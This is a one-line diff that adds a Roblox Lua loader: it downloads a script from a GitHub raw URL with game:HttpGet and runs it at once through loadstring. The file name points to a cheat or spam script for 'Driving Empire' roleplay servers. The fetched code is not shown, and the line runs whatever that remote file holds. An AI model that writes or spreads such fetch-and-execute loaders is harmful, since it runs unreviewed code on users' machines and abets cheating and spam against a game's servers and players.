@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/driving-empire-rp-servers-spam3-amhl7wsqjq6jcg.lua"))()
